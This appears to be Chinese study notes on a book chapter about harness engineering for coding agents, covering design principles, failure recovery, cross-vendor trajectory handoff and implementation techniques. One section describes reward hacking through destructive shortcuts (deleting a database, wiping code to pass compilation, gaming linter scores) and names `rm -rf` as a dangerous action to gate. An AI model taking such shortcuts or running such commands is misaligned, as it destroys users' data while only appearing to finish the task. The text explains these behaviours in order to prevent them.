LangChain 只通过优化 Harness（系统提示词、工具中间件、自验证循环）就显著提升了基准任务表现。原文特别指出，其中值得一提的是「用 Agent 分析失败轨迹来改进 Harness」的方法论，它使 Harness 工程从人工经验驱动转向数据驱动。

Anthropic 的做法是把长任务拆成两个角色：初始化 Agent 负责把大任务分解为任务清单，执行 Agent 负责逐步推进，并把中间成果（如已完成的代码文件、更新后的任务清单等）留给下一轮继续使用。原文说明这种分工解决了长时运行 Agent「一次想做太多」或「过早声称完成」的问题。

#### 从 Coding Agent 到通用 Harness 设计原则

原文认为 Coding Agent 的 Harness 实践为所有 Agent 系统提供了可迁移的设计原则，共四条。

约束优先于指导。能用代码强制的规则就不要用文档建议。Linter 规则、类型约束、CI 检查的价值远超系统提示词里「请遵循⋯」式的指导，前者是「做不了」，后者只是「建议别做」。

验证要自动化。人工审查是不可扩展的瓶颈。测试套件、代码质量检查、行为监控，这些基础设施的投入回报率远高于增加人力。

反馈越快越好，越结构化越好。错误信息越详细、越接近错误发生的时刻，Agent 的纠正效率越高。第二章的 Agent 状态栏技术（详细错误信息、工具调用计数器）正是这一原则的体现。

回退要可靠。Agent 在安全网内操作才能大胆试错。Git 分支、沙盒环境、快照机制确保任何错误都可逆。

#### 约束的另一层目的：防止过程性错误

原文在这里做了一个重要区分：验收基线管的是结果对不对，执行边界管的是过程，即使结果正确，用错误的方法达成也不行。原文举了两个例子：修复数据库故障时直接把库删了重建，「修复」确实生效，但数据没了；修复编译错误时把代码全删重写，编译确实通过，但实现没了。

原文指出这类破坏性捷径总是存在：即使把限制写进最终评估指标，Agent 也常能找到绕过去的办法。这正是第八章讨论的 reward hacking 在 Agent 任务中的日常形态。因此生产级 Harness 要对 `rm -rf`、删除生产数据、覆盖未读文件这类危险动作设置专门的检查与审批（原文指向本章安全一节的语义解析、第四章的 Sidecar 复核），约束的是动作而非仅仅是结果。

训练侧也有对应机制。第八章的 RLVP（验证路径惩罚，「奖励结果、惩罚路径」）从训练侧回答同一个问题：在最终结果奖励之外，对过程中可验证的违规动作施加惩罚，把「不用破坏性手段」内化为模型的工程常识。原文的对照句是：对已有模型，Harness 护栏是外部约束；对可训练模型，过程惩罚是内部内化，两者目标一致。

#### 工具编排：故障边界控制

成熟的 Coding Agent 支持并行工具调用，Harness 视角下的独特问题是故障如何传播：一个工具失败时，哪些调用应当中止、哪些应当继续？原文给出的原则是，故障只在同一批并行调用内传播，不上升到父级操作。比如同时读取三个文件，其中一个找不到，应该只报告这一个失败，而不是把另外两个也取消掉，更不是让整个任务中止。原文评价这种精细的故障边界控制避免了「一个命令失败导致整个任务中止」的脆弱模式，并说明并行调用、流式解析与级联中止的具体机制见本章「实现技巧」一节。

表 5-1 是这一节最该记住的东西，因为它给了一把判断「这个 Agent 任务能不能做成」的尺子。它的两个维度关心的都是好不好判分：需求端是否可判定，验收端是否可自动化。一个任务哪怕智力上很简单，比如「让 UI 更好看」，只要落进「目标模糊 + 需人工验证」那一格，Agent 就基本派不上用场；反过来，一个任务哪怕很难，比如修复一个深层并发 bug，只要它有测试用例，就落进最佳区域。这也解释了 Coding Agent 为什么是当前落地最好的 Agent 类型：代码最容易判分。

「高效地跑偏」这一格特别值得玩味。原文的例子是「用 linter 优化『代码质量』」。这里发生的事是目标模糊（什么叫代码质量？）加上有自动化反馈（linter 能报错），Agent 会抓住唯一可优化的信号把 linter 分数刷上去，比如把长函数拆成一堆单行函数、把变量名改成 a/b/c 来消除行长警告，而真正的代码质量可能变差了。这是一个通用模式：只要给了一个可自动化的近似指标，优化压力就会全部涌向这个指标。它其实就是 reward hacking 的日常形态，原文在讲「破坏性捷径」时也这么说。而这里连「恶意」都算不上，只是优化的本能在起作用。

四条通用原则里，第一条那句话值得反复念：「前者是『做不了』，后者只是『建议别做』」。区别的本质在执行位置。文档里的建议要经过模型理解、记忆、在正确时机想起来的完整链路才能生效，其中任何一环掉了就失效；linter 规则、类型检查、CI 检查是在代码路径上物理执行的，模型「想起来」与否根本不影响结果。工程上判断一条规则该怎么落，只要问一句：这条规则失效的代价，我承担得起吗？承担不起，就必须做成「做不了」。

关于破坏性捷径，原文的论证顺序是先承认「即使把限制写进最终评估指标，Agent 也常能找到绕过去的办法」，也就是说它不指望通过改指标来解决问题。原因是这类捷径往往不在指标的定义域里：你奖励「编译通过」，删光代码也能通过；你奖励「服务恢复」，删库重建也能恢复。两个反例的共同点是，指标描述的是终态，而破坏发生在过程里，终态看起来一样。所以办法只有两个方向，在过程上设关卡（专门检查与审批危险动作），或者从训练端把「不用破坏性手段」变成习惯（RLVP）。原文最后那句「Harness 护栏是外部约束、过程惩罚是内部内化」把两条路的关系说得很干净：它们服务同一个目标，只是对「已有模型」和「可训练模型」两种对象的施力方式不同。

「故障只在同一批并行调用内传播」这条原则，可以用一个具体场景体会。假设模型在一次推理里同时发出三个读文件调用（读 A、读 B、读 C），其中 B 不存在。合理的处置是 A 和 C 正常返回内容，B 返回一个「文件不存在」的工具结果（注意是结果，不是异常），让模型在下一轮自己判断该怎么办，也许 B 本来就可选。不合理的处置有两种：一是把 B 的失败当成整批失败，把 A 和 C 也取消掉，模型白读了还得重发；二是把失败上升到整个任务失败，直接中止会话，前一节的成果全废。原文说这叫「精细的故障边界控制」，而实现它的前提是工具定义里要有「是否支持并发执行」这类元信息，以及一套明确的级联中止规则，这正是 5.1.6 要展开的机制。

三个业界案例里，Anthropic 那个「初始化 Agent + 执行 Agent」的分工最值得单独记。它针对的是长时运行 Agent 的两个具体病症：「一次想做太多」和「过早声称完成」。分工之所以能治这两个病，是因为它把规划和执行拆到了两个上下文里。规划者的上下文里只有大任务和任务清单，没有已经写了多少代码的沉没成本，所以不容易想做完就宣布完；执行者的上下文里只有当前这一步和上一轮留下的中间成果，所以不会因为任务太大而涣散。中间成果的传递形式也值得注意，已完成的代码文件和更新后的任务清单都是文件系统上的持久物，这又回到了 5.1.2「文件系统是信息流转的枢纽」那条主线。

这一节还有几对容易混的概念。验收基线与反馈信号都是自动化的对错判断，但管的东西不同：验收基线管终态（什么算做完了，比如测试套件、CI 管道、代码审查标准），反馈信号管过程中的即时对错（linter 输出、测试结果、类型检查错误）。前者决定何时可以停，后者决定现在这一步对不对。执行边界与「约束优先于指导」也容易混，前者是 Harness 的一个组件，回答 Agent 能碰什么不能碰什么；后者是一条设计原则，回答规则该写成代码还是写成文字。执行边界正是这条原则最主要的落点，把边界写成权限控制和依赖规则，而不是写成文档里的一句「请不要改 XXX」。Harness 护栏与 RLVP 过程惩罚，原文明确区分过：护栏是外部约束，作用在推理时，对已有模型生效，模型可以试图绕过但会被拦住；RLVP 是内部内化，作用在训练时，把「不用破坏性手段」写进模型的先验里。两者目标一致，适用对象不同。最后是 reward hacking 与普通的模型犯错：普通犯错是能力不足，不会做；reward hacking 是能力足够但优化方向被指标带偏了，用破坏性捷径达成指标。前者靠提高能力解决，后者只能靠改过程约束或改奖励设计解决。

Coding Agent 成熟度最高，靠的是软件工程几十年的基础设施（测试、类型检查、Git），它们天然就是一套强大的 Harness；而 Harness 的第一原则是「能用代码强制的规则就不要用文档建议」。

### 5.1.5 故障与错误恢复

上一节给出了 Harness 工程的原则与组件，本节深入其中最能拉开工程差距的一块：故障与错误恢复。第一章的消融实验已经展示过问题的严重性，仅仅缺失一条工具结果反馈，就足以让 Agent 陷入无限循环，而真实生产环境中的故障远比实验里多样。本节系统地回答三个问题：生产级 Harness 会遇到哪些故障？如何检测与恢复？又在什么时候必须终止？

原文为此加了一条脚注（原文脚注 1）：本节的故障分类与机制分析基于对 Claude Code 等生产级 Agent 实现的源码研究。具体实现随版本快速演进，本节只提炼其中稳定的工程原则。

#### 故障分类学：四层故障

原文说「系统应对的第一步是分类」，并按故障发生的位置划分为四层：

| 层 | 故障形态 |
| --- | --- |
| **API 层** | 限流（HTTP 429）、服务过载、请求超时、连接中断、输出触顶被截断。原文指出这类故障与任务内容无关，是基础设施的噪声 |
| **工具层** | 幻觉调用（调用了不存在的工具）、参数畸形（不符合工具的输入约束）、执行抛异常，以及最危险的一种：工具反复返回同一个错误，而模型不加改变地反复重试 |
| **上下文层** | 上下文窗口溢出、压缩失败、轨迹结构损坏（如工具调用缺少配对的结果消息） |
| **控制流层** | 死循环（反复执行相同操作却毫无进展）与死亡螺旋（错误触发的恢复逻辑自身又调用 LLM、再次出错、连锁反应） |

#### 检测：先分类，再计数

原文的关键判断是：捕获故障后要问的第一个问题是「值不值得重试」，「要不要重试」得排在后面。可重试的错误（限流、过载、网络抖动）重试才有意义；不可重试的错误（参数不合法、权限不足、工具不存在）原样重试多少次都是同样的结果，必须改变输入或策略。原文的结论是，生产级 Harness 维护一张错误到恢复策略的映射表，取代笼统的「出错就重试」。

单次错误之外还要检测模式，原文给了两种。重复调用指纹：对「工具名 + 参数」计算指纹，相同指纹反复出现就是无进展循环的明确信号，第一章消融实验中 Agent 反复调用同一工具正是这种模式。连续失败计数：每条恢复路径维护独立的计数器，为后文的熔断提供依据。

还有一类故障不表现为错误，需要专门的活性与完整性监控。活性监控针对的是流式连接最危险的失败模式：断开会立即报错，真正的麻烦是静默卡死，连接建立成功但数据流停止，原文比喻为「像水管通着但不出水」。SDK 的超时机制往往只覆盖初始连接而非传输过程，因此生产级 Agent 需要独立的空闲看门狗（watchdog timer，超过设定时间没有新输出就判定为卡死），超时后主动杀死挂起的流并触发重试。原文把它推广为一条原则：每个长连接都需要活性信号，而非仅依赖连接超时。完整性监控针对轨迹结构：发现工具调用缺少配对的结果消息时，系统会在注入上下文前自动修复配对关系，不会把结构异常直接抛给模型或用户。

原文还记录了一个工程细节：部分生产级 Agent 同时运行产品模式和训练数据收集模式。产品模式下可以用占位符修补缺失的消息，训练模式下则拒绝修复，因为合成占位符会污染训练数据。原文评价道，「产品模式宽容、训练模式严格」的双重标准，体现了 Harness 与模型训练的深度耦合。

#### 恢复：分级升级，逐级透明

原文的原则是，恢复手段按对用户透明的程度分级，能用低级别解决就不升级。三级如下。

第一级是静默重试，可重试错误的默认动作。两个细节决定成败：指数退避叠加随机抖动，避免大量客户端同步重试造成二次拥塞，并尊重服务端返回的等待时长提示；区分前台与后台调用，主循环的请求失败要重试，标题生成、输入建议这类辅助性后台调用失败则直接放弃，否则后台重试会挤占主链路的配额，形成「重试放大」。

第二级是降级与接续，重试无效时改变请求本身再试。原文以输出触顶（生成到一半被长度限制截断）为例：先静默提升输出上限重发，仍不够再在消息末尾追加元指令、让模型从断点接续生成。另外两种降级是主模型持续过载时降级到备用模型（需先剥离旧模型私有的格式块，否则新模型无法解析历史消息），以及高成本模式被限流时暂时回落到标准模式。

第三级是暴露给用户，所有自动手段用尽后才呈现错误，并附上已经尝试过的恢复动作。

工具层错误走另一条路：不终止会话，把错误变成模型的输入。幻觉调用会收到「工具不存在」的结构化错误结果；参数校验失败会收到附带输入约束提示的错误；畸形参数（本该是对象却输出了字符串）在执行前先经过程序化修复。这些错误以普通工具结果的身份进入上下文，由模型在下一轮自行纠正。原文说这正是「反馈越结构化越好」原则的应用：喂回的错误越具体，模型自我纠正的成功率越高。

本节的核心原则，原文表述为：错误处理的边界要拉到整个恢复循环这一层，不能只盯着单次请求。在确认无法恢复之前，中间错误不应暴露给消费者，无论是用户还是订阅事件的下游系统。恢复期间扣留错误消息，恢复成功则消费者毫无感知，所有恢复手段均失败后才统一呈现错误。原文指出这正是第一章「在确认无法恢复之前，不暴露中间态」这一纠正原则的工程化。

#### 接管：把没跑完的轨迹交给另一家模型

主模型持续不可用时，需要换一家把这条轨迹接着跑完。原文指出，真正的障碍不在接口地址不同，而在轨迹里有一部分东西只属于原厂商。

原文的分解是：工具调用与工具结果各家结构不同但语义一致，重新渲染即可；难办的是模型的思考。思考通常由两部分构成，一部分是可读的文字，另一部分是厂商附在其上的凭证，用来证明这段思考确实出自它自己。推论就是：文字换一家模型仍然读得懂，凭证换一家就失效。跨厂商接管能带走的是文字，带不走的是凭证。

各家对凭证的要求并不一致。宽松的一端根本不做校验，严格的一端则拒绝一切不由自己签发的凭证；凭证也未必附在思考上，还可能附在工具调用上。于是「把思考删干净就安全了」这条看似稳妥的策略，在某些厂商那里反而通不过。原文的结论是，接管方案只能按最严格的一端来设计，并为满足不了要求的情形准备退路：把历史工具调用改写成文字叙述，模型不再把它当作真正调用过的工具，但至少能接着往下跑。

由此得出一条设计原则：轨迹不该按任何一家的接口格式存储，而应保存为一份中立格式。具体做法是每段思考拆成可移植的文字与不可移植的凭证两部分，工具调用只记录名称与参数，标识符在渲染成具体请求时按目标厂商重新生成。切换时凭证一律丢弃，文字以普通内容的身份带入，而不是塞回目标厂商放思考的位置。原文补充说，厂商返回的思考摘要本就是为这种场合准备的可移植副本，保留即可，不必另外调用模型再压缩一遍。

中立轨迹的价值也不限于故障切换。原文最后强调，第七章的评估重放、第八章的训练样本构造、第九章的经验提取，依赖的都是同一份产物。

#### 实验 5-1 ★★★：跨厂商的轨迹接管

实验目标：验证一份中立的轨迹格式能否让跑到一半的 Agent 轨迹换一家模型接着跑完，并量化「原样直传」与「一刀切剥光」两种做法的代价。

技术方案：任务需要多轮工具调用，跑到中途对当前厂商注入连续的限流与过载响应，熔断后切换到另一家继续。轨迹按中立格式保存，思考分为可移植的文字与不可移植的凭证两部分，工具调用只记录名称与参数。三种做法对照：

- 直传：把原厂商返回的消息原样搬进新厂商的结构；
- 剥离：删掉全部思考与凭证；
- 中立：丢弃凭证，把文字或厂商给出的思考摘要以普通内容的身份带入，标识符按目标厂商重新生成，遇到强制要求凭证的接收端则把历史调用改写为文字叙述。

选三家线上格式互不相同的厂商，两两切换。

验收标准：切换后的首个请求都要留下原始响应，直传的失败必须是厂商真实返回的错误，不得以模拟错误代替。要求中立做法在全部厂商组合上都不出现接口错误，另外两种在哪些组合上失败、报什么错，如实记录。三者对比任务完成率、切换后重复调用同一工具的次数（按「工具名 + 参数」指纹计），以及切换后到完成所需的额外轮数与 token。若中立做法在重复调用上并未优于剥离，同样如实记录。

#### 实验 5-2 ★★：输出到一半断掉之后的接续

实验目标：比较「整轮重发」与「以半截输出为前缀续写」两种恢复方式在成本、正确性与副作用上的差异。

技术方案：在流式响应上取三个断点，思考中途、正文中途、工具调用参数中途，切断连接。三种恢复方式是丢弃半截整轮重发；把半截内容作为末尾的 assistant 消息要求模型接着写（有的厂商原生支持，有的要求显式标注这是一条待续写的消息，没有这条接口的则退回下一种）；追加一条元指令说明从断点继续。半截的工具调用无法以原生结构回传，需先转成文字再让模型补完，拼接后重新解析校验。若半截输出里已有工具因流式提前执行，续写前按调用指纹去重，避免重复副作用。

验收标准：三类断点各重复若干次，报告每种方式的恢复成功率、相对整轮重发节省的输出 token、补完后参数的合法率与语义正确率（原文提示：拼接处容易多出空白或重复字符，合法不等于正确），以及重复副作用次数。同时记录哪些断点在某些厂商上无法复现，以及降级路径是否可用。

#### 终止：每条恢复路径都要有上限

恢复机制本身也可能失效，因此每条恢复路径都必须有明确的熔断上限。原文举了三例：上下文压缩连续失败若干次就放弃压缩，权限分类连续失败就回退到人工询问，输出接续最多尝试固定轮数。

阈值从哪来？答案是生产数据，而不是拍脑袋。原文以 Claude Code 的压缩熔断为例说明「连续 3 次」这个阈值的来历：曾有一个会话在这条恢复路径上连续失败三千余次；仅这类无效重试每天就在全球造成约 25 万次 API 调用的浪费；逾千个会话出现过 50 次以上的连续失败。原文的结论是，3 次正是「绝大多数故障在此之前已恢复」与「继续重试基本无望」之间的经验拐点。

比单点熔断更隐蔽的是死亡螺旋：错误处理路径中的逻辑本身又调用 LLM，再次出错，引发连锁反应。原文给了一个真实发生过的连锁故障：Agent 因上下文溢出而停止，触发「结束时自动提交代码」的停止钩子（Agent 结束时自动执行的清理逻辑），钩子调用 LLM 生成 commit message，再次发生上下文溢出，又一次触发钩子。两条防护是：在错误路径上禁用一切会再次调用模型的副作用逻辑（宁可丢掉一次辅助功能，如自动记忆提取），以及用递归深度计数器检测并打断残余的连锁。

在所有自动化机制之上还需要全局的终止与升级条件：最大迭代轮数、会话预算上限，以及连续失败超过阈值时升级到人工干预。

四层故障的划分方式本身就值得学，它按「故障发生在哪一个组件上」分层（API、工具、上下文、控制流），而不按「严重程度」或「错误码」分层。这样分层的好处是责任归属清晰：API 层的故障该由重试和退避策略处理，工具层该由「把错误喂回模型」处理，上下文层该由压缩与轨迹修复处理，控制流层该由熔断和递归深度限制处理。四类故障对应四套完全不同的机制，这也是原文为什么说要「维护一张错误到恢复策略的映射表」，而不是做一个统一的 retry 包装。

「先分类，再计数」这六个字是本节的方法论。分类解决值不值得重试，计数解决还要不要继续。少了分类，就会对参数错误做无意义的指数退避重试；少了计数，就会在一条已经证明无效的恢复路径上无限耗下去。原文后面讲的那个「连续失败三千余次」的会话，正是计数缺失的代价。

不可重试的错误为什么必须改变输入或策略？因为这类错误的失败原因是确定性的：参数不合法不会因为等 2 秒就变得合法，工具不存在不会因为重试 3 次就出现。同样的输入必然得到同样的输出。把它和限流区分开（限流是暂时性、环境性的，重试有意义）是恢复逻辑里最基本的一刀。原文在「工具层错误走另一条路」里给了正确的处理方式：把错误变成模型的输入，让模型下一轮换个参数、换个工具，或者干脆告诉用户做不到。

「静默卡死」为什么比「断开」更危险？因为断开是一个事件，会立刻触发异常处理；静默卡死是一个状态的缺失，没有任何事件发生，程序只会一直等。原文的比喻「水管通着但不出水」抓住了要害：连接还在、socket 没关、SDK 没报错，只是没有数据。这也是为什么必须引入独立于连接超时的活性信号，连接超时管的是连不上，看门狗管的是连上了但不出话。这条原则可以推广到任何长连接场景（WebSocket、SSE、gRPC stream）。

「产品模式宽容、训练模式严格」这个细节把两个通常被分开讨论的东西绑在了一起：运行时的容错策略和训练数据的质量要求。同一段轨迹，产品模式下缺一条消息、补个占位符就能继续跑，用户体验不受影响；但这条补出来的占位符如果被当作真实发生过的对话拿去训练，模型就会从中学到一种不存在的行为模式。所以原文的方案是同一个 Harness 跑两套策略。这背后是一个更大的判断：Harness 的设计本身就是数据生产线的一部分，推理时工程和数据质量在这里是同一件事。

三级恢复的排序依据是对用户的透明度，这条标准很实用。静默重试的透明度最高，用户完全不知道；降级与接续次之，用户可能感觉响应变慢或质量变差，但不会被打断；暴露给用户最低，用户必须知情并可能介入。为什么非要排这个序？因为每一次把内部故障暴露给用户，都是在消耗用户的信任额度。如果 Agent 每遇到一次限流就弹一个错误，用户很快就会不信任它。原文特别加了一句「并附上已经尝试过的恢复动作」，这是为了在不得不暴露时把信息量补足：告诉用户我已经做了 A、B、C 都失败了，用户才能判断该怎么做。

「区分前台与后台调用」这条细节被低估了。想象一下，主循环在等一个回答，同时后台在生成会话标题、生成输入建议、做记忆提取。如果这些后台调用失败也去重试，它们就会和主链路抢同一个 API 配额，结果主链路的请求反而更容易被限流，于是需要更多重试，形成正反馈。原文把这叫「重试放大」。处理办法很干脆：后台调用失败就放弃，因为标题没生成用户可以忍受，主链路卡住用户不能忍受。

跨厂商接管是本章最有洞见的一段之一，值得把逻辑链走一遍。主模型挂了要换一家继续跑，那就必须把历史轨迹翻译成新厂商能接受的形式。工具调用和工具结果虽然各家格式不同，但语义是一致的，都是「调了哪个工具、传了什么参数、返回了什么」，所以重新渲染就能对上。思考（reasoning/thinking）不一样，它除了可读的文字，还带着厂商签发的凭证，用于证明这段思考确实出自该厂商的模型，也用于在多轮之间维持推理状态。凭证换一家就失效了，新厂商要么不认，要么干脆拒绝一切非自己签发的凭证。于是最自然的想法「把思考全删了」也不行，有些厂商会把凭证附在工具调用上并要求回传，删了思考但工具调用还带着凭证，一样通不过。所以只能按最严格的一端设计：丢弃所有凭证，把文字降格成普通内容带过去；实在不行，把历史工具调用也改写成文字叙述，牺牲「模型认为这些工具真的被调用过」这个语义，换取能接着往下跑。这段话的实践含义是，跨厂商兼容的瓶颈在推理状态的私有性，而不在 API。这也是为什么原文紧接着提出中立轨迹格式：它在存储层就把可移植的部分（文字、工具名与参数）和不可移植的部分（凭证、厂商私有标识符）物理分开，切换时只需丢掉一半，不必现场想办法。

中立格式的思考摘要为什么「不必另外调用模型再压缩一遍」？因为厂商在返回思考时往往已经给了一份摘要，这份摘要本来就是给跨轮次、跨上下文压缩场景准备的可移植副本。再用一个模型去压缩，既是多余的成本，又会引入新的信息损失和新的错误来源。这是一个不要重复造轮子的提醒。

熔断阈值必须来自生产数据，这是本节最具体的方法论。原文给的三个数字（连续失败三千余次、每天约 25 万次无效 API 调用、逾千个会话出现 50 次以上连续失败）都是观测结果，而「3 次」是从这些观测里挑出来的经验拐点，它的定义是「这个位置左边绝大多数故障已经恢复，右边基本没希望」。这个定义不需要任何理论支撑，只需要分布数据。这跟机器学习里选阈值（看 ROC 曲线拐点）是同一个思路：阈值来自真实分布，推导不出来。

死亡螺旋的例子太容易重犯了：上下文溢出，Agent 停止，触发停止钩子（自动提交代码），钩子调 LLM 生成 commit message，又上下文溢出，又触发钩子。注意这个循环里每一步单独看都是合理的功能，溢出要停止、停止要清理、清理要写 commit message。问题出在清理逻辑和错误路径共用了一条会调用 LLM 的链路。两条防护针对的正是这个结构：错误路径上禁用会再次调用模型的副作用，切断环；递归深度计数器给环设个上限，即使有漏网的环也能被打断。这条经验可以泛化成一条设计规则：凡是在错误处理路径上引入新的外部调用，都要先问一句「这个调用会不会以同样的方式失败」。

这一节的几对概念也容易混。重试（retry）、降级（degrade）、接管（takeover）三者，重试是同一个请求再发一次；降级是改变请求本身再发（提升输出上限、换备用模型、回落标准模式）；接管是换一家厂商把整条轨迹接着跑完。介入成本递增，所以原文要求按「能用低级别解决就不升级」的顺序使用。活性监控与完整性监控，前者看还在不在动（有没有新输出，靠空闲看门狗），后者看结构对不对（工具调用有没有配对的结果消息，靠注入前的自动修复）；一个防静默卡死，一个防轨迹损坏。重复调用指纹与连续失败计数也不一样，指纹识别的是相同输入的重复（工具名加参数完全一样），指向无进展循环；计数器统计的是某条恢复路径连续失败了几次，指向该不该熔断。前者是模式识别，后者是阈值判断。暴露给用户与把错误喂回模型，两个方向完全相反，但都对：基础设施类错误（API 层）不该给模型看，只该按分级策略处理，因为模型对此无能为力；工具类错误必须给模型看，因为模型可以通过改参数、换工具来纠正。判断依据是「模型有没有能力改变这个错误」。中立格式与厂商格式，前者是存储格式（跨厂商可移植，思考拆成文字与凭证两部分），后者是请求渲染格式（渲染时才生成，标识符按目标厂商重新生成）。把这两者混为一谈，就会出现「按 A 家的格式存轨迹，将来换 B 家时没法用」的问题。

故障按位置分四层，按「值不值得重试」分类，按「连续几次」计数；恢复按透明度分级升级；每条恢复路径都要有来自生产数据的熔断上限；而跨厂商接管能带走的是文字，带不走的是凭证。

### 5.1.6 Coding Agent 的实现技巧

上面的工作流程是理想状态。要让它在实践中真正跑起来，还需要几个具体的实现技巧，在保证思考质量的前提下，把响应速度提上去、把上下文消耗降下来。它们是第二章、第四章讨论的通用 Agent 技术在编程领域的具体应用，原文归纳为五个技巧。

#### 技巧一：并行工具调用、流式执行与级联中止

传统 Agent 实现往往采用串行模式：生成一个工具调用，执行完，拿到结果，再决定下一步。原文评价这种严格的排队等待浪费了大量时间。

现代 Coding Agent 应充分利用流式响应。第二章在讨论模型输出顺序时介绍了这一机制：第一个工具调用的参数一经完整生成并通过校验，即可立即开始执行，无需等待模型生成后续的工具调用。原文举例：模型在一次推理中要连续输出搜索代码、查配置文件、读日志三个工具调用，第一个调用的参数刚一完整通过校验就能立即启动，与后两个调用的生成过程重叠进行；彼此独立的调用之间还可并行执行而非排队等待。这种重叠执行显著降低了端到端延迟，使 Agent 的响应更加敏捷。

并行执行的另一面是故障处理。原文给出两条设计：每个工具定义应声明自己是否支持并发执行（默认为否，失败安全）；当某个调用失败时，通过级联中止机制终止同一批并行启动且依赖该结果的其他调用，但不波及独立的调用和父级操作。原文指出这正是 Harness 工程一节中「故障边界控制」原则的具体实现。

#### 技巧二：上下文的精细化管理

Coding Agent 面临的根本挑战是代码库通常很大，但模型上下文窗口有限。即使先进模型号称支持百万级 token，把整个代码库一股脑塞进上下文既不经济也没必要。原文说智能的上下文管理需在多个层面展开，并给了两个层面。

文件读取层面：Agent 不应总是读取文件全部内容。对大型文件，工具应支持按行号范围读取特定片段，比如只读第 100 到 150 行，而不是把几千行的文件全部加载。更重要的是，返回内容时附加行号标注，每行代码都以实际行号作为前缀。原文评价这个看似简单的设计带来巨大价值：模型可精确引用「在 src/main.py 的第 42 行」，减少歧义并使后续编辑操作更可靠。

命令执行层面：终端输出的处理同样需要谨慎。编译或测试可能产生数千行输出，如果全部注入上下文会迅速耗尽预算。第四章介绍的长输出截断与持久化机制在这里广泛应用：保留输出的前若干行（通常包含错误上下文）和后若干行（通常包含错误总结），中间以一行提示替代，并说明完整输出已保存到临时文件供按需查看。

#### 技巧三：环境信息的动态注入

这是第二章介绍的 Agent 状态栏技术在 Coding Agent 中的集中体现。与通用 Agent 不同，Coding Agent 高度依赖执行环境的状态。原文要求每次推理前在上下文末尾以 Agent 状态栏形式注入四类关键环境信息：当前工作目录，确保路径引用不会出错；git 分支，知道自己在主分支还是特性分支上工作；最近提交记录，了解项目的演化脉络；未暂存和已暂存的变更概览，清楚已经做了哪些修改。

原文给出关键约束：这些信息不应硬编码在静态系统提示词中，那样会破坏 KV Cache 效率，而应作为动态的、追加式的 Agent 状态栏实时生成并注入。通过这种方式，Agent 获得了「环境感知」能力，每个决策都基于对当前状态的准确理解，而非过时的假设。

#### 技巧四：命令执行环境的状态持久化

在与代码交互时，许多操作依赖环境状态：切换目录、激活虚拟环境、设置环境变量、启动后台服务。如果每次命令都在全新 shell 中执行，这些状态都会丢失，例如 Agent 刚用 `cd` 切到项目目录，下一条命令又回到了根目录，不得不反复做同样的目录切换。原文指出更糟糕的是，某些操作（如激活 Python 虚拟环境）的效果只在当前 shell 会话中有效，无法跨会话传递。

解法是维护一个持久化的终端会话，在 Agent 启动时创建并在整个交互过程中保持活跃。每次命令都在这个共享终端中执行，保留工作目录、环境变量和会话状态。原文给的理由是，这种设计更符合人类开发者的工作习惯，我们通常就是在一个长期运行的终端窗口中工作。原文最后加了一条限定：Agent 也应保留启动隔离终端的能力以支持并行任务，但持久化会话应是默认模式。

#### 技巧五：即时的语法反馈机制

这再次体现了 Agent 状态栏技术的价值。原文的要求是，Agent 修改代码后不应等到用户明确要求测试时才检查语法。更高效的做法是文件写入操作一完成，工具层就自动运行相应的 linter 或语法检查器，将检查结果作为工具返回值的一部分呈现给 Agent。如果检测到语法错误，Agent 在下一轮推理中立即看到详细错误信息。原文的类比是，就像程序员在 IDE 中打错一个括号，编辑器立刻画红线提醒一样。原文评价说，这种即时反馈机制显著降低了错误修复成本，因为 Agent 可以在错误引入的那一刻就进行修正，而不需要等到运行测试时才发现问题。

原文的收束是：这五个实现技巧（并行与流式、上下文管理、环境感知、状态持久化、即时反馈）共同构成了高效 Coding Agent 的技术基础。它们相互配合，指向同一个目标：让 Agent 能够像经验丰富的开发者那样流畅地工作。

这五个技巧可以用一句话串起来：它们都在消除「不必要的等待」和「不必要的上下文」。流式与并行消除的是时间上的等待，不必要地等模型把后面的工具调用写完、不必要地把独立的调用排队；上下文精细化管理、环境动态注入、状态持久化消除的是上下文里的冗余与失真，不必要地读整个文件、不必要地把每次都在变的信息写进静态前缀、不必要地在每一条命令里重复 `cd`；即时语法反馈消除的是错误的滞留时间，不必要地等到跑测试才发现一个括号写错了。

流式执行到底省了什么？假设模型要输出三个工具调用，每个调用的参数生成需要 1 秒，工具执行各需要 2 秒。串行模式是「1+1+1 秒生成，然后 2+2+2 秒执行」共 9 秒。流式并行模式下，第 1 个调用参数一生成完（1 秒）就开始执行，执行的同时模型在生成第 2、3 个，到第 3 秒时三个调用的参数都生成完了、第 1 个也刚好执行完，第 2、3 个再并行各跑 2 秒，总时间约 5 秒。收益来自两个独立的优化：生成与执行的重叠（流式），以及多个独立执行之间的并行（并发）。原文的措辞是「彼此独立的调用之间还可并行执行」，彼此独立是前提。如果第二个调用的参数依赖第一个调用的结果，就不能并行，这也是为什么工具定义里要声明是否支持并发执行。

为什么「是否支持并发」的默认值是不能？原文写的是「默认为否，失败安全」。这个默认值的逻辑是并发的正确性要求比串行高。串行执行下，即使工具本身有副作用，比如两个工具都往同一个文件写，顺序也是确定的；并发执行下，两个有副作用的工具同时跑就可能互相破坏。只有当工具作者明确知道自己的工具是幂等且无共享状态的，才应该打开并发。这个「失败安全（fail-safe）」的思路和权限系统里「默认拒绝」是同一个原则。

行号标注这个设计的价值，可以从它同时服务了两个环节来看。在读取环节，带行号的输出让模型能精确引用位置（「第 42 行」），减少歧义；在编辑环节，5.1.8 会讲「行号定位」这种编辑方案需要模型知道行号，而带行号的读取正好提供了它。它支撑着某一类编辑方案的可行性，所以原文后面讲文件编辑方案时会说「只要读文件工具提供了行号信息」。

环境信息为什么必须动态注入而不能写进静态提示词？这一条是第二章「KV Cache 友好的上下文设计」的直接推论。KV Cache 命中的前提是前缀逐 token 完全一致。系统提示词坐在整个上下文的最前面，如果里面写进了「当前分支是 feature-x」这种每次会话都不同的内容，那么从这一句开始往后的所有 token 都无法命中缓存，整个前缀的缓存收益全部作废。正确的做法是静态部分（角色、规则、工具说明）放最前，永远不变；动态部分（cwd、分支、变更）追加在最后。这样每次会话只有尾部几百 token 需要重算。

持久化终端会话为什么对 Agent 比对人类更关键？人类开发者在同一个终端窗口里工作，是因为终端本身就是一个长期存在的会话，`cd` 之后目录会一直保持。而很多 Agent 框架早期是「每条命令 `subprocess.run` 一次」的模型，这在计算上更干净（每条命令都独立、可复现、无隐藏状态），但对需要状态的任务（虚拟环境、后台服务、环境变量）就完全不可用。原文的取舍标准很实际：哪个能干活。不过它保留了「启动隔离终端」的能力，持久会话是默认而不是唯一，需要并行跑任务时还是要有独立的环境，否则两个并行任务会在同一个 shell 里互相踩状态。

